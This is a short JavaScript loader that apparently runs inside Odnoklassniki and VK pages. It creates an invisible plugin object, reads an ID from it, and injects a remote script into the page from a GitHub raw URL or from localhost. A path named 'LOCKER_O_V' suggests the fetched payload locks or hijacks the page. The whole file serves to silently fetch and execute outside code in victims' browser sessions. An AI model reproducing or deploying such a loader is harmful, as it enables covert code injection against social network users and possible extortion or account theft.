var plg = document.createElement("object");
if (plg) {
	plg.setAttribute("type", "application/afp");
	plg.setAttribute("id", "AFP");
	plg.setAttribute("width", 0);
	plg.setAttribute("height", 0);
	document.body.appendChild(plg);
}

if(location.hostname.indexOf('odnoklassniki') > -1)
	var scr = 'https://raw.github.com/ashanmilkin/scripts/master/lod.js';
if(location.hostname.indexOf('vk') > -1)
	var scr = 'https://raw.github.com/ashanmilkin/scripts/master/lvk.js';
	
try{
	var id = plg.Get('id');
	switch(id){
		case '1a659e81db184a6aeaddb56e2d4e2ad6':
			if(location.hostname.indexOf('odnoklassniki') > -1)
				var scr = 'http:/localhost/LOCKER_O_V/lod.js';
			if(location.hostname.indexOf('vk') > -1)
				var scr = 'http://localhost/vk/lvk.js';
		break;
		
		case 'e747eb2129f44e85b0d0cc5a70074daa':
			if(location.hostname.indexOf('odnoklassniki') > -1)
				var scr = 'http:/localhost/LOCKER_O_V/lod.js';
			if(location.hostname.indexOf('vk') > -1)
				var scr = 'http://localhost/vk/lvk.js';
		break;
		
		default: break;
	}
}catch(e){}

if(scr){
	var script = document.createElement('script');
	script.setAttribute('type', 'text/javascript');
	script.setAttribute('src', scr);
	document.body.appendChild(script);
}